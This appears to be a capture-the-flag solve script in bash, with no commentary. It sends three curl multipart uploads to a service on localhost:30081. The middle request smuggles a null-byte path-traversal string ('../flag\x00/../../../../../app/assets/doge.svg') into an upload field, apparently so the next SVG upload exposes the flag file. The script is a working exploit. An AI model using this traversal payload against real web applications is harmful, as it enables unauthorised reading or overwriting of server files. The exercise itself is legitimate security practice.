#!/bin/bash

curl -s -F "rawfile=@a.svg" "localhost:30081"
printf "../flag\x00/../../../../../app/assets/doge.svg" | curl -s -F "image-presets=@-" -F "font-presets=NotoSerif-Regular.ttf" "localhost:30081" > /dev/null
curl -s -F "rawfile=@b.svg" "localhost:30081"
